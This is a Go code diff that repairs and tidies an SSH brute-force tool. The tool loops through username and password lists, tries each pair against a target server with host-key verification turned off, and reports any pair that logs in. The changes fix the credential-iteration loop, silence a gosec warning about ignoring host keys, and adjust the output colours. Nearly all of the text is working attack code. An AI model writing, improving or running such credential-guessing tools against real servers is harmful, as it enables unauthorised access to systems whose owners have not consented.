@@ -3,10 +3,12 @@ package main
 import (
 	"bufio"
 	"fmt"
-	"github.com/fatih/color"
-	"golang.org/x/crypto/ssh"
+	"io"
 	"os"
 	"strings"
+
+	"github.com/fatih/color"
+	"golang.org/x/crypto/ssh"
 )
 
 var (
@@ -56,11 +58,15 @@ func bruteForceSSH(target string, userFile *os.File, passFile *os.File) {
 	if !strings.Contains(target, ":") {
 		target += ":22"
 	}
-	userFileScanner := bufio.NewScanner(userFile)
 	passFileScanner := bufio.NewScanner(passFile)
-
 	for passFileScanner.Scan() {
 		password := passFileScanner.Text()
+		_, err := userFile.Seek(0, io.SeekStart)
+		userFileScanner := bufio.NewScanner(userFile)
+		if err != nil {
+			handleErr(err)
+			return
+		}
 		for userFileScanner.Scan() {
 			user := userFileScanner.Text()
 			config := &ssh.ClientConfig{
@@ -68,24 +74,23 @@ func bruteForceSSH(target string, userFile *os.File, passFile *os.File) {
 				Auth: []ssh.AuthMethod{
 					ssh.Password(password),
 				},
-				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+				HostKeyCallback: ssh.InsecureIgnoreHostKey(), //nolint //"Use of ssh InsecureIgnoreHostKey should be audited (gosec)"
 			}
-			_, err := ssh.Dial("tcp", target, config)
+			_, err = ssh.Dial("tcp", target, config)
 			if err == nil {
-				fmt.Println(color.HiGreenString("Found credentials: ") + user + ":" + password)
+				fmt.Println(color.CyanString("Found credentials: ") + user + ":" + password)
 				return
-			} else {
-				fmt.Println(color.YellowString("Failed attempt: ") + user + ":" + password)
 			}
+			fmt.Println(color.YellowString("Failed attempt: ") + user + ":" + password)
 		}
-		if err := userFileScanner.Err(); err != nil {
+		if err = userFileScanner.Err(); err != nil {
 			handleErr(err)
 			continue
 		}
 	}
 	if err := passFileScanner.Err(); err != nil {
 		handleErr(err)
-		return
+		//return
 	}
 }
 
